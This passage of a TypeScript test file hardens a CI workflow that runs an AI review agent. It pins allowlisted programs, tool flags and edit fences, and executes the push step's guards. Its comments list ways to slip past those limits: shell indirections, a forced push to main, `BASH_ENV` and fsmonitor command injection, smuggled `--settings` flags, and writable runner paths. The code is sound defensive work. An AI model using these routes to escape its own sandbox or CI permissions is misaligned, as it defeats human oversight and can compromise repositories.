 * Every distinct program a `run:` body invokes, sorted, split into the heads this parser can
 * RESOLVE and the ones it cannot (a command head carrying a glob). Both halves are pinned by
 * value at the call site; the second exists so an unresolvable head fails loudly instead of
 * being dropped out of the first.
 *
 * Pinned as a whole SET at the call site for the reason `gitSubcommands` is: every bound in
 * this file is written in terms of the program it bounds, so an INDIRECTION reaches the bounded
 * thing while naming nothing any of them looks for. `sh -c 'git apply --cached ...'` and
 * `xargs git apply --cached` both write arbitrary content into the index while `git` is the
 * program of no command at all, and `trap 'exit 0' ERR` converts the push step's fail-closed
 * contract into a fail-silent one while naming no guard. Enumerating the indirections is the
 * wrong side to enumerate; enumerating the programs this job runs means a new one has to be
 * justified here before it can be handed anything.
 */
function programHeads(src: string): { programs: string[]; globbed: string[] } {
  const names = new Set<string>();
  const globbed = new Set<string>();
  for (const body of runBodies(src)) {
    for (const { words } of shellCommands(body)) {
      // Read the program THROUGH the prefix words, not as the command's first word. A prefix
      // hides the program after it: with only `VAR=` stripped, `if jq ...` and `if sudo
      // apt-get ...` both reported `if`, so `jq` and `apt-get` ran in the shipped file named
      // by no assertion at all, and `if sh -c 'git apply --cached ...'` was green while the
      // bare `sh -c` form was refused. A keyword is never the answer to "what program runs".
      let rest = words;
      let prefix = '';
      while (rest.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[0]) || COMMAND_PREFIX.test(unquoteWord(rest[0])))) {
        prefix = unquoteWord(rest[0]);
        rest = rest.slice(1);
      }
      // A non-keyword prefix with NOTHING after it is itself the program - `env` alone prints
      // the environment of the step it runs in. Stripping it left an empty vector, which the
      // `continue` below then reported as no program at all.
      const name = unquoteWord(rest[0] ?? '') || (/^(command|env|sudo|time)$/.test(prefix) ? prefix : '');
      // `for`/`local`/`exit` and friends head a command that contains no program, so the word
      // after them is a variable or a status and must not be reported as one.
      if (!name || NON_COMMAND_HEAD.test(name)) continue;
      // Three shapes this parser reports in command position that are not programs, dropped so
      // the pinned set stays readable rather than because they are safe: a redirection operand;
      // an ALL-CAPS identifier, which is a shell VARIABLE reached through `$(( ))` arithmetic;
      // and a bare integer, which falls out of the same arithmetic and of `awk`'s field
      // references. Nothing an indirection would be spelled as is excluded - `sh`, `bash`,
      // `xargs`, `eval`, `trap` and a `./path` are all still reported, which is what this set
      // exists to refuse.
      if (/^\d*[<>]/.test(name) || /^[A-Z_][A-Z0-9_]*$|^\d+$/.test(name)) continue;
      // A glob in command position is UNRESOLVABLE statically, so it is reported separately and
      // pinned by value at the call site rather than dropped. Every one in the file today is a
      // `case` arm pattern (`|` and `)` are command separators, so each arm parses as its own
      // command), but "carries a glob" is not the same proposition as "is an arm pattern", and
      // a silent `continue` on the first excluded the second: `ba?h -c 'git push --force origin
      // HEAD:main'` named a program that the universal backstop below then never saw. Failing
      // by value means a new unresolvable head is a deliberate edit, arm pattern or not.
      if (/[*?]/.test(name)) {
        globbed.add(name);
        continue;
      }
      names.add(name);
    }
  }
  return { programs: [...names].sort(), globbed: [...globbed].sort() };
}

const invokedPrograms = (src: string) => programHeads(src).programs;

/**
 * The job-level `if:`, split into conjuncts. The step-scoped `ifConjuncts` cannot reach it -
 * it is two indent levels shallower - and it is the gate every other bound in this file is
 * downstream of, so it was the one `if:` nothing asserted.
 */
function jobIfConjuncts(src: string): string[] {
  // Exactly one, not the first of several. A DECOY job block carrying its own `if:` lets the
  // real fork and draft gates be deleted from the job that runs while this assertion still
  // finds A matching gate above it and passes.
  const blocks = [...withoutComments(src).matchAll(/^ {4}if: \|\n((?: {6}.*\n)+)/gm)];
  expect(blocks, 'expected exactly one block-scalar job-level if:').toHaveLength(1);
  return (blocks[0]?.[1] ?? '')
    .replace(/\s+/g, ' ')
    .trim()
    .split('&&')
    .map(conjunct => conjunct.trim())
    .filter(Boolean);
}

/** The one object the job reads out of the store and executes, pinned separately below. */
const REDACTOR_OBJECT = 'HEAD:.github/scripts/redact-review-transcript.py';

/**
 * True when a command emits bytes the agent can write.
 *
 * Reading the object store at exactly `HEAD:<the redactor>` is the one exemption, and it is
 * spelled as that one path rather than as `HEAD:` because `HEAD` is NOT a synonym for "bytes
 * no write tool reaches". It is that only until `git commit` - after which, inside this very
 * step, `HEAD` IS the agent's fold commit, and every path the guard above does not refuse
 * (`.ts`, `.js`, `.py`, `.mjs`) is in it. The exemption exists for one invocation which its
 * own test pins verbatim, so it is scoped to that invocation. Every OTHER git subcommand emits
 * metadata (paths, counts, status) rather than file content, so it cannot carry a payload.
 * Any other program naming a checkout path is reading the working tree, which the agent holds
 * `Edit` on in fold mode.
 */
function readsWritableBytes(words: string[]): boolean {
  const plain = commandProgram(words).map(unquoteWord);
  if (plain[0] !== 'git') return plain.some(arg => referencesCheckout(arg));
  const sub = gitSubcommand(plain);
  if (sub !== 'show' && sub !== 'cat-file') return false;
  return !plain.slice(1).every(arg => arg.startsWith('-') || arg === sub || arg === REDACTOR_OBJECT);
}

/**
 * Every place a `run:` body hands a checkout path to something that is not a known data-only
 * reader - as the program itself, as an argument, or through a pipe. Returns a description per
 * hit so a failure names the offending command.
 */
function checkoutCodeReferences(src: string): string[] {
  const hits: string[] = [];
  for (const body of runBodies(src)) {
    const commands = shellCommands(body);
    // `eval` and `source` turn a data read into code, so in a body that uses either, no
    // command's path argument can be assumed to be data - `eval "$(cat scripts/env.sh)"`
    // executes a tracked file through two commands that are individually harmless.
    const turnsDataIntoCode = commands.some(({ words }) => /^(eval|source|\.)$/.test(unquoteWord(words[0] ?? '')));
    // A `VAR=path` prefix used to be discarded whole, which let `S=scripts/x.sh; bash "$S"`
    // name no path at any point an assertion looked. The assignment is tracked instead, so a
    // later `$S` counts as the path it holds.
    const tainted = new Set<string>();
    const namesTainted = (text: string) =>
      [...text.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/g)].some(m => tainted.has(m[1]));
    commands.forEach(({ words, sep }, index) => {
      let rest = words;
      // Both tests read the UNQUOTED word, for the reason `commandProgram` does: the tokenizer
      // keeps quote characters and quoting a prefix changes nothing about what runs, so
      // `'sudo' bash ./scripts/x.sh` and `'S'=scripts/x.sh` would otherwise be a program named
      // `'sudo'` and an assignment that taints nothing.
      while (
        rest.length &&
        (/^[A-Za-z_][A-Za-z0-9_]*=/.test(unquoteWord(rest[0])) || SHELL_PREFIX.test(unquoteWord(rest[0])))
      ) {
        const assignment = unquoteWord(rest[0]).match(/^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/);
        if (assignment && referencesCheckout(assignment[2])) tainted.add(assignment[1]);
        rest = rest.slice(1);
      }
      if (!rest.length) return;
      const [program, ...args] = rest;
      const name = unquoteWord(program);
      if (referencesCheckout(name) || namesTainted(name)) {
        hits.push(`program is a checkout path: ${words.join(' ')}`);
        return;
      }
      if (DATA_ONLY_COMMANDS.test(name) && !turnsDataIntoCode) return;
      // A pipe carries the upstream command's bytes into this one's stdin, so a pair that is
      // individually harmless - `cat ./scripts/x.sh` and `bash` - is the same execution as
      // `bash ./scripts/x.sh`. This is the class `turnsDataIntoCode` above exists to catch,
      // written the other way round, and enumerating INTERPRETERS on this side would be the
      // same wrong side to enumerate that `DATA_ONLY_COMMANDS` argues against: `xargs bash`
      // and a `$( )` here-string reach it without naming one.
      const upstream = index > 0 ? commands[index - 1].words : [];
      if (sep === '|' && readsWritableBytes(upstream)) {
        hits.push(`${name} is piped bytes from the checkout: ${upstream.join(' ')} | ${words.join(' ')}`);
        return;
      }
      if (args.some(arg => referencesCheckout(unquoteWord(arg)) || namesTainted(arg))) {
        hits.push(`${name} is given a checkout path: ${words.join(' ')}`);
      }
    });
  }
  return hits;
}

/**
 * The key/value pairs of a YAML mapping at a fixed indent, as ONE shared reader.
 *
 * PARSE OR REFUSE, because every caller is a key-set bound and a reader that quietly drops a
 * line it does not recognise under-states the set it exists to pin. YAML reads a plain key, a
 * `'single'`-quoted one and a `"double"`-quoted one as the same key, so a reader matching one
 * spelling leaves the other two invisible: `"BASH_ENV": /tmp/x.sh` added to a step's `env:` - or
 * to the JOB's, which reaches every step - puts a real variable in the environment while the
 * pins read the block as unchanged. A line at the key indent that is NOT a key is refused
 * outright rather than skipped, so a reader can never silently under-count again.
 *
 * A deeper line belongs to the previous key's value (a block scalar, say) and is not a key.
 */
function mappingEntries(block: string, indent: number, label: string): [string, string][] {
  const prefix = ' '.repeat(indent);
  const entries: [string, string][] = [];
  for (const line of block.split('\n')) {
    if (!line.trim() || /^\s*#/.test(line)) continue;
    if (!line.startsWith(prefix)) {
      throw new Error(`${label}: line is not indented to the key column: ${JSON.stringify(line)}`);
    }
    const body = line.slice(prefix.length);
    // A line indented PAST the key column belongs to the previous key's value (a block scalar,
    // say), and is not a key.
    if (body.startsWith(' ')) continue;
    const match = body.match(/^((?:"[^"]*"|'[^']*'|[A-Za-z_][A-Za-z0-9_-]*)):(?: ?(.*))?$/);
    if (!match) throw new Error(`${label}: line at key indent is not a key: ${JSON.stringify(line)}`);
    entries.push([(match[1] ?? '').replace(/^(['"])([\s\S]*)\1$/, '$2'), match[2] ?? '']);
  }
  return entries;
}

/**
 * The body of a mapping key (`with:`, `env:`, `claude_args:`, `if:`), lifted by YAML's
 * indentation rule rather than by a fixed column count and a "deeper than me, empty, or stop"
 * arm.
 *
 * Those two arms stop at a line that is neither deep enough nor blank - and a COMMENT is exactly
 * that line, because YAML ignores comment lines for structure. A comment indented above the key
 * column, between the key and the last entry, therefore ended the capture early: everything below
 * it fell outside the block, `mappingEntries` was handed a well-formed prefix and threw nothing,
 * and the pin read an under-counted set as an unchanged one. Appending two lines to the `with:`
 * block - `# trailing note` at the key column, `settings: ./x` one level in - left every key-set
 * pin in this file green while js-yaml read a fourth key, and `settings` writes
 * `$HOME/.claude/settings.json`, whose `hooks` block is command execution with `Bash` and every
 * write tool denied.
 *
 * So a block ends at the first non-comment, non-blank line indented at or BELOW its key;
 * comments and blanks inside it are carried through for the reader to skip. Exactly one key line
 * at that indent, so a decoy copy cannot be the one that is read.
 */
function liftBlock(text: string, key: string, indent: number, label: string): string {
  const lines = text.split('\n');
  const head = new RegExp(`^ {${indent}}${key}:(.*)$`);
  const starts = lines.flatMap((line, index) => (head.test(line) ? [index] : []));
  expect(starts, `${label}: expected exactly one ${key}: at indent ${indent}`).toHaveLength(1);
  const body: string[] = [];
  for (let i = (starts[0] ?? 0) + 1; i < lines.length; i++) {
    if (/^\s*$/.test(lines[i]) || /^\s*#/.test(lines[i])) {
      body.push(lines[i]);
      continue;
    }
    if ((lines[i].match(/^ */) ?? [''])[0].length <= indent) break;
    body.push(lines[i]);
  }
  return body.join('\n');
}

/**
 * The KEYS of a mapping at one indent, across a whole document or block.
 *
 * A thin wrapper over `mappingEntries` so a key-set pin cannot fall back to a bare-token sweep:
 * `/^ {4}([a-z][a-z-]*):/gm` reads a plain key and nothing else, while YAML reads
 * `"permissions":` as the same key - so a quoted job-level `permissions: write-all`, inserted
 * above `runs-on:`, replaced the workflow-level block wholesale and gave `contents: write` to
 * every step in the job while both key-set sweeps still reported the file unchanged.
 *
 * Lines shallower than the requested indent belong to another level and are dropped; a line AT
 * that indent that is not a key is refused by the reader rather than skipped.
 */
function mappingKeysAt(text: string, indent: number, label: string): string[] {
  const block = text
    .split('\n')
    .filter(line => !line.trim() || (line.match(/^ */) ?? [''])[0].length >= indent)
    .join('\n');
  return mappingEntries(block, indent, label).map(([key]) => key);
}

/** The keys of a step's `with:` mapping, in file order. */
function withKeys(src: string, name: string): string[] {
  return mappingEntries(liftBlock(step(src, name), 'with', 8, `${name} with:`), 10, `${name} with:`).map(
    ([key]) => key
  );
}

/** A step's `env:` block as ordered key/value pairs, comment lines dropped. */
function envPairs(src: string, name: string): [string, string][] {
  return mappingEntries(liftBlock(step(src, name), 'env', 8, `${name} env:`), 10, `${name} env:`);
}

const envKeys = (src: string, name: string) => envPairs(src, name).map(([key]) => key);

/**
 * Every step's `env:` KEY SET, as one map from step name to keys - `[]` for a step that declares
 * none, including the agent step.
 *
 * `envPairs` was called for exactly two step NAMES, and Actions env precedence is step over job,
 * so an unread step `env:` overrides the job block pinned by value. Two one-line escapes were
 * green against that: `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: '0'` added to the agent step (the scrub
 * is the second line of the no-shell posture, and the key is the same one - only its POSITION
 * differed from the job-level pin that catches the same edit), and `BASH_ENV: /tmp/x.sh` added to
 * any other step, which `bash -e {0}` sources before that step's body runs. A pin per step NAME
 * cannot see either, so the whole map is pinned instead: a key added anywhere, and a block added
 * to a step that had none, both reach it.
 */
const stepEnvKeys = (src: string): [string, string[]][] =>
  stepChunks(src).map(({ name, body }) => [
    name,
    /^ {8}env:$/m.test(body)
      ? mappingEntries(liftBlock(body, 'env', 8, `${name} env:`), 10, `${name} env:`).map(([key]) => key)
      : [],
  ]);

/**
 * The review step's `claude_args:` block tokenised the way the action tokenises it.
 *
 * claude-code-action concatenates the whole block, drops WHOLE `#` lines, and then SHELL-PARSES
 * the remainder. A newline is therefore ordinary whitespace to the consumer: `--max-turns 80
 * --settings ./x.json` on ONE line is identical at the CLI to the same flag on its own line.
 * A line-anchored regex over this block reads neither - it read only the first flag of each
 * line, and an appended `--settings` whose file declares `hooks` is command execution with
 * `Bash` and every write tool denied.
 *
 * GitHub substitutes every `${{ ... }}` before the action runs, so the file's bytes do not
 * decide the token count at those four positions - the expansion does, and `escapeShellMeta`
 * (`/[()|&;<>]/g`) touches neither a space nor a `-`. Each one is therefore substituted with a
 * `expansion` probe rather than assumed to be one word, and the caller runs the same assertions
 * over a MULTI-WORD probe: that passes only if every expansion sits inside quotes, which is
 * what actually makes the collapse true. Three of the four were quoted already; the fourth
 * (`--model`) smuggled a whole `--settings ./x.json` past this pin.
 */
function claudeArgTokens(src: string, expansion = 'EXPANSION'): string[] {
  const block = liftBlock(step(src, 'Run /bot-review'), 'claude_args', 10, 'claude_args');
  expect(block, 'no claude_args block').toBeTruthy();
  const text = withoutComments(block).replace(/\$\{\{[\s\S]*?\}\}/g, expansion);
  const tokens = [...text.matchAll(/(?:"[^"]*"|'[^']*'|\S)+/g)].map(m => m[0]);
  // `shell-quote` treats an unquoted `#` as a comment to the end of the WHOLE STRING, not to
  // the end of its line - the block is one string by then. An inline `#` on the allow-list line
  // therefore deletes the deny list and the turn cap, which is a widening that leaves every
  // surviving token looking exactly as it should. Truncated here the way the consumer does it.
  const comment = tokens.findIndex(token => token.startsWith('#'));
  return comment === -1 ? tokens : tokens.slice(0, comment);
}

/**
 * A probe that is several shell words, one of which is a flag that reaches command execution.
 * Substituted for each `${{ }}` in the block: inside quotes it is one token and changes
 * nothing; unquoted it becomes separate tokens and `--settings` lands on the flag set.
 *
 * It deliberately carries no quote character, and that is a statement about what a probe can
 * prove here rather than an omission. Every value in this block is delimited by `"`, so an
 * expansion whose CONTENT holds a `"` breaks out of its quotes no matter how the file quotes
 * the expansion - the committed file would fail such a probe, and the probe would be reporting
 * only that quoting is necessary and not sufficient. A `'` is the opposite: inside `"..."` the
 * shell takes it literally, so it can break nothing and would prove nothing either. The
 * content axis is closed where it belongs instead - `toolFlagValues` refuses an interior `"`
 * outright, and both tool lists are pinned by value on both arms, so a break-out has to survive
 * an assertion that reads the spec it smuggles itself in as.
 */
const MULTI_WORD_EXPANSION = 'probe --settings ./probe-settings.json';

/**
 * The `Edit()` fences that sit OUTSIDE the mode ternary, so they hold in review mode too.
 *
 * All three are absolute, because a bare write-tool grant reaches anywhere on the filesystem
 * and not only the working directory. `runner.temp` holds the runner's own
 * `_runner_file_commands` files, i.e. command execution in every later step. `_actions` holds
 * the unpacked JavaScript of every `uses:` step - including the one that runs after the agent
 * with the App private key in its env - and `runners` holds the node that executes it, so
 * both are the PROGRAM of a step rather than an input to one. `.bun` is the same kind: the
 * action's own trailing `Post buffered inline comments` step resolves `bun` by bare name off
 * a `$HOME` PATH entry, so the exec-bit argument the workflow makes for `git`/`gh`/`python3`/
 * `jq` does not reach it. The `_actions` pair is written as a literal because no expression
 * yields that path, which makes it a premise about the hosted image.
 *
 * Note what asserting it here does and does not buy, because the two are easy to conflate.
 * It forces an edit to the FENCE to be deliberate. It does not bind the runner: `runs-on`
 * reads `vars.RUNNER_LABEL`, a repo variable settable in the web UI with no commit and no
 * diff, and a self-hosted runner with a different work root or home makes the three absolute
 * specs match nothing with nothing here going red. `RUNS_ON` below pins the DEFAULT so that half of the
 * move is a reviewable edit; the variable override is outside what this repo can pin, and a
 * self-hosted move needs its own fence entries.
 */
/**
 * Every program a `run:` body in this workflow may invoke. See `invokedPrograms` for why this is
 * an allowlist. Absent, and deliberately so: `sh`, `bash`, `xargs`, `eval`, `trap`, `source`,
 * `curl` and `python` (only `python3` runs here, and only as `-I -`).
 *
 * Shell keywords and command prefixes are NOT entries. They used to be, which is what let a
 * program named after one hide: `if jq ...` and `if sudo apt-get ...` reported `if`, so the two
 * programs this list now names last ran unpinned by anything. `sudo` is a prefix rather than an
 * entry for the same reason - it is transparent to this sweep now, so `sudo <anything>` reports
 * `<anything>`.
 *
 * One entry's ARGUMENT is itself a program: `awk`. It is bounded by pinning its invocations by
 * value at the call site, not by this list.
 */
const PROGRAMS = [
  '[',
  // `sudo apt-get` installs bubblewrap before the agent runs, so nothing it could be pointed
  // at is agent-writable.
  'apt-get',
  'awk',
  'base64',
  'break',
  'cat',
  'count_since',
  'cut',
  'date',
  'echo',
  'emit',
  'gh',
  'git',
  'grep',
  'jq',
  'mktemp',
  'printf',
  'python3',
  'read',
  'rm',
  'set',
  'sha256sum',
  'sleep',
  'tail',
  'tr',
  'true',
  'wc',
];

const ALWAYS_ON_EDIT_FENCES = [
  'Edit(/${{ runner.temp }}/**)',
  'Edit(//home/runner/work/_*/**)',
  'Edit(//home/runner/runners/**)',
  'Edit(//home/runner/.bun/**)',
];

/** The runner the three `/home/runner/...` fences above are a premise about. */
const RUNS_ON = "runs-on: ${{ vars.RUNNER_LABEL || 'ubuntu-latest-m' }}";

/**
 * The only arguments this job may pass the action. Asserted as a SET, and over the token vector
 * rather than over lines, because enumerating the ways to widen a permission model is the wrong
 * side to enumerate: `--settings` and `--mcp-config` both reach command execution before any
 * permission check has a say, and a BARE token is appended to the tool lists by
 * `parseClaudeArgsToExtraArgs`, so it grants a tool without naming a flag.
 */
const ALLOWED_CLAUDE_ARGS = ['--allowedTools', '--disallowedTools', '--max-turns', '--model'];

function assertArgSurface(tokens: string[]): void {
  expect([...new Set(tokens.filter(token => token.startsWith('-')))].sort()).toEqual([...ALLOWED_CLAUDE_ARGS].sort());
  // Flag/value pairs end to end. Anything else - a valueless flag, a second value, a bareword -
  // lands on an odd index or leaves the vector an odd length, and is refused here.
  expect(tokens).toHaveLength(ALLOWED_CLAUDE_ARGS.length * 2);
  for (let i = 0; i < tokens.length; i += 2) {
    expect(ALLOWED_CLAUDE_ARGS, `not an allowlisted argument: ${tokens[i]}`).toContain(tokens[i]);
    // Unquoted first: the consumer applies its own `startsWith('-')` test AFTER shell-quote has
    // stripped the quotes, so `"--dangerously-skip-permissions"` as a value reads as a flag
    // there and as an ordinary value here.
    const value = unquoteWord(tokens[i + 1] ?? '');
    expect(value.startsWith('-'), `${tokens[i]} takes no value: ${tokens[i + 1]}`).toBe(false);
  }
}

/** The value of a step's single-line `if:`, trimmed. */
function ifLine(src: string, name: string): string {
  const value = step(src, name).match(/^ {8}if: (?![|>])(.*)$/m)?.[1];
  expect(value, `${name}: no single-line if:`).toBeTruthy();
  return (value ?? '').trim();
}

/**
 * The value of a `--allowedTools` / `--disallowedTools` flag, unquoted, in file order.
 *
 * BOTH spellings. The CLI accepts the camelCase and the kebab-case name for each of these and
 * ACCUMULATES across them, so matching only the spelling that happens to be committed lets a
 * second line in the other spelling widen the allow list while the `toHaveLength(1)` and the
 * by-value pins below both still read the original line and pass.
 */
function toolFlagValues(src: string, flag: string): string[] {
  const kebab = flag.replace(/[A-Z]/g, char => `-${char.toLowerCase()}`);
  const spelling = kebab === flag ? flag : `(?:${flag}|${kebab})`;
  const values = [...src.matchAll(new RegExp(`^\\s*--${spelling} "(.*)"\\s*$`, 'gm'))].map(m => m[1]);
  // The value is delimited by `"`, so an interior one closes the flag's own quote at the shell
  // and everything after it lands on argv as separate arguments - `--settings ./x.json` among
  // them, which is command execution before any permission check has a say. The capture above
  // is greedy, so it still yields ONE value and the mode ternary still splits: the break-out is
  // invisible to every assertion downstream unless it is refused here.
  for (const value of values) expect(value, `--${flag} value breaks out of its quotes`).not.toContain('"');
  return values;
}

/**
 * Splits one tool-flag value on its `${{ cond && 'a' || 'b' }}` mode ternary. The arms are
 * identified by POLARITY, never by length: labelling them by which list is longer is what let an
 * inverted condition read as correct. Text outside the ternary belongs to both arms. The
 * condition is returned so it can be asserted too.
 */
function toolListModes(value: string): { condition: string; fold: string[]; review: string[] } {
  // The condition may hold no braces, so a plain `${{ runner.temp }}` elsewhere in the value
  // cannot be mistaken for the start of the ternary.
  const ternary = value.match(/\$\{\{([^{}]*?)&&\s*'([^']*)'\s*\|\|\s*'([^']*)'\s*\}\}/);
  // Thrown rather than expect()ed: a missing ternary means the mode split itself is gone, and
  // every assertion downstream of here would be meaningless rather than merely failing.
  if (!ternary) throw new Error(`no mode ternary in tool list: ${value}`);
  const [whole, condition, trueArm, falseArm] = ternary;
  const literal = value.replace(whole, '');
  const names = (branch: string) =>
    (literal + branch)
      .split(',')
      .map(name => name.trim())
      .filter(Boolean);
  return { condition, fold: names(trueArm), review: names(falseArm) };
}

/**
 * The conjuncts of a step's block-scalar `if:`, in order. Compared as a set by value rather than
 * by substring presence: `steps.x.outcome == 'success' || true` still CONTAINS the text of the
 * gate it disarms, so `toMatch` cannot tell a live gate from a neutralised one.
 */
function ifConjuncts(src: string, name: string): string[] {
  const stepSrc = step(src, name);
  expect(stepSrc, `${name}: if: is not a block scalar`).toMatch(/^ {8}if: \|$/m);
  return withoutComments(liftBlock(stepSrc, 'if', 8, `${name}: if`))
    .replace(/\s+/g, ' ')
    .trim()
    .split('&&')
    .map(conjunct => conjunct.trim())
    .filter(Boolean);
}

type StagedFile = { path: string; lines?: number; binary?: boolean; deleted?: boolean };

/**
 * Runs the push step's staged-path guard and diff-size bound, lifted verbatim out of the
 * committed YAML, against a scratch repo with `files` staged. Returns the exit status and
 * combined output, so a test can assert what the guard actually blocks instead of asserting that
 * its patterns are spelled correctly.
 *
 * The region runs under the same `set -euo pipefail` the step uses, with `emit` and
 * `$GITHUB_OUTPUT` stubbed - those are the only two things it needs from the surrounding step.
 *
 * VERBATIM, comments included. An earlier version ran the region through `withoutComments`
 * first, which repaired the file and then certified the repair: a `#` line between two
 * backslash-continued `grep -E` arguments ends the command at that point, because bash removes
 * the continuation before it tokenizes. That shipped - the guard silently lost its last arm and
 * `dev` and `LICENSE` became pushable - and this harness reported 21/21 green over it. A comment
 * is part of the program the runner executes, so it is part of the program this runs.
 */
function runStagedGuards(
  src: string,
  files: StagedFile[],
  home?: { attributes?: string }
): { status: number; out: string } {
  const commands = step(src, 'Push fold commit');
  // Lifted from the staged-path enumeration, which sits OUTSIDE `BLOCKED=$( )` precisely so
  // that a failure in it is fatal - `set -e` is not inherited into a command substitution, so
  // a region starting at `BLOCKED=` would execute the guard without the half that fails closed.
  const regions = [
    ...commands.matchAll(/^ {10}STAGED_PATHS=\$\(mktemp\)$[\s\S]*?-gt 800 \]; then\n[\s\S]*?^ {10}fi$/gm),
  ];
  // Exactly one, not the first of several. Lifting by first match means a DECOY copy of the
  // guard placed above the real one is what this harness executes, while the code the step
  // actually reaches sits below it unmeasured and green.
  expect(regions, 'expected exactly one staged-path guard and size bound in the push step').toHaveLength(1);
  const region = regions[0]?.[0];

  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bot-fold-guard-'));
  try {
    const git = (...args: string[]) => execFileSync('git', ['-C', dir, ...args], { stdio: 'pipe' });
    git('init', '-q', '.');
    const write = (file: StagedFile) => {
      const abs = path.join(dir, file.path);
      fs.mkdirSync(path.dirname(abs), { recursive: true });
      fs.writeFileSync(abs, file.binary ? Buffer.from([0x1f, 0x8b, 0x00, 0x41]) : 'x\n'.repeat(file.lines ?? 1));
      git('add', '--', file.path);
      return abs;
    };
    // A staged DELETION scores its removed lines in numstat's second column, which is a
    // separate term in the size bound's awk expression and unreachable from an add-only
    // fixture. It needs a parent commit to be a deletion at all.
    const deletions = files.filter(file => file.deleted);
    if (deletions.length) {
      for (const file of deletions) write(file);
      git('-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-q', '-m', 'base');
      for (const file of deletions) {
        fs.rmSync(path.join(dir, file.path));
        git('add', '--', file.path);
      }
    }
    for (const file of files.filter(f => !f.deleted)) write(file);
    const script = [
      'set -euo pipefail',
      'emit() { echo "emit:$1"; }',
      `GITHUB_OUTPUT=${JSON.stringify(path.join(dir, 'outputs'))}`,
      region ?? '',
      'echo GUARDS_PASSED',
    ].join('\n');
    // `core.attributesFile` defaults to a path under $HOME with no config entry behind it, so
    // the step's `GIT_CONFIG_*` nulling does not reach it and only the per-invocation
    // `-c core.attributesFile=/dev/null` does. Planting the file here is what makes that flag
    // behavioural rather than a literal nothing reads: `* binary` turns every text file into
    // numstat's `-`, which refuses every fold, and `* -diff` turns a real binary into a
    // countable text file, which turns the binary arm AND the 800-line bound off together.
    const fakeHome = path.join(dir, 'home');
    if (home?.attributes !== undefined) {
      fs.mkdirSync(path.join(fakeHome, '.config', 'git'), { recursive: true });
      fs.writeFileSync(path.join(fakeHome, '.config', 'git', 'attributes'), `${home.attributes}\n`);
    }
    // The lifted region's `mktemp` files have to land in the scratch dir removed below. `TMPDIR`
    // alone does not do it - see `writeMktempShim`, which puts that bound in the one place both
    // platforms honour.
    const scratchTmp = path.join(dir, 'tmp');
    const bin = path.join(dir, 'bin');
    for (const scratch of [scratchTmp, bin]) fs.mkdirSync(scratch);
    writeMktempShim(bin);
    const env: NodeJS.ProcessEnv = {
      ...process.env,
      PATH: `${bin}${path.delimiter}${process.env.PATH ?? ''}`,
      HOME: fakeHome,
      TMPDIR: scratchTmp,
    };
    // Or git reads $XDG_CONFIG_HOME/git/attributes from the DEVELOPER's home instead.
    delete env.XDG_CONFIG_HOME;
    const run = spawnSync('bash', ['-c', script], { cwd: dir, encoding: 'utf8', env, timeout: 120_000 });
    return { status: run.status ?? -1, out: `${run.stdout}${run.stderr}` };
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

type PushFixture = {
  /** Post-agent state of a TRACKED file: its new line count, or a binary rewrite. */
  edits?: StagedFile[];
  /** Files the agent dropped that were never tracked. `git add -u` must leave these behind. */
  untracked?: string[];
  /** Move the remote's head on after the base push, so the fold push is a non-fast-forward. */
  diverge?: boolean;
};

/** What the push step did: what it REPORTED, and what actually arrived on the remote. */
type PushOutcome = {
  status: number;
  out: string;
  /** Every `pushed=` the step wrote, in order. More than one means it took two exits. */
  pushed: string[];
  reason: string | undefined;
  /** Subjects on the remote's head ref, newest first. */
  remoteLog: string[];
  /** Paths the remote's tip commit changed, or [] while the tip is still the base commit. */
  remoteChanged: string[];
  /**
   * Every ref the remote holds. The PR head is the only ref this step may put anything on, and
   * every other field here reads that one ref - so a push to any OTHER ref arrived unobserved.
   * Asserted as a set because the thing to bound is the class: `git push --force origin
   * HEAD:main` reached through `awk 'BEGIN{system(...)}'`, `sudo`, a shell, or anything else
   * that runs a command is the same end state however it is spelled, and end state is the only
   * side of this with a finite number of cases.
   */
  remoteRefs: string[];
};

const PUSH_HEAD_REF = 'feature/fold-target';
const PUSH_TRACKED = ['README.md', 'src/a.ts', '.github/workflows/ci.yml', 'scripts/x.sh'];

/**
 * Runs the WHOLE `Push fold commit` body, lifted verbatim out of the committed YAML, against a
 * scratch repo with a real bare remote, and reports the END STATE: exit status, every value the
 * step claimed for `pushed`, and what the remote ended up holding.
 *
 * Why the whole body and not the guard region `runStagedGuards` lifts. Every other assertion
 * over this step is either a pattern over its text or an execution of the two bounds in the
 * middle of it, which left the relationship between what the step REPORTS and what it DOES
 * asserted nowhere - and that gap is a class, not an instance. Five one-line edits (`set +e`, a
 * `trap 'exit 0' ERR`, wrapping the body in a subshell, `emit false || exit 1`, moving the
 * success `exit 0` into an `else`) each reach the exact "reported success, pushed nothing" end
 * state the step's own comment says `-e` prevents. And a staging route composed entirely of
 * subcommands the allowlist already permits - a redirection writing a `git show` into
 * `.github/workflows/ci.yml` in the WORKING TREE, then `commit -a` - puts CI configuration on
 * the branch while the path guard, which reads the INDEX, correctly saw only the tracked edit.
 * None of that is visible to a matcher over the file; all of it is visible here.
 *
 * The one thing not real is the network: a `git` shim on PATH swaps the
 * `https://...@github.com/...` argument for the scratch bare repo and execs the real git with
 * every other argument untouched. So the add, both bounds, the commit, the refspec, the absence
 * of --force and the failure classifier are all shipped bytes running under real git.
 */
function runPushStep(src: string, fixture: PushFixture): PushOutcome {
  // Verbatim, comments included, for the reason `runStagedGuards` states.
  const bodies = runBodiesRaw(step(src, 'Push fold commit'));
  // One `run:`, for the same reason: a second body in the step would leave whichever one this
  // executes unrepresentative of what the runner runs.
  expect(bodies, 'expected exactly one run: body in the push step').toHaveLength(1);
  const body = bodies[0] ?? '';
  // This harness EXECUTES that body with a token-shaped value in its environment, so a git
  // config key is not something to discover afterwards: `git -c core.fsmonitor='sh -c ...'` is
  // a command git runs, and a body carrying one would be run BY the suite that is supposed to
  // refuse it - reported green, having exfiltrated the fixture's token. Refuse first instead.
  expect(
    gitConfigKeys(step(src, 'Push fold commit')).filter(key => !GIT_CONFIG_KEYS.includes(key)),
    'the push step sets a git config key this harness will not execute'
  ).toEqual([]);
  // Same argument for the step's `env:`, and it is this harness's own doing: the env is read
  // from the YAML below and passed through VERBATIM, which is what makes an env edit reach the
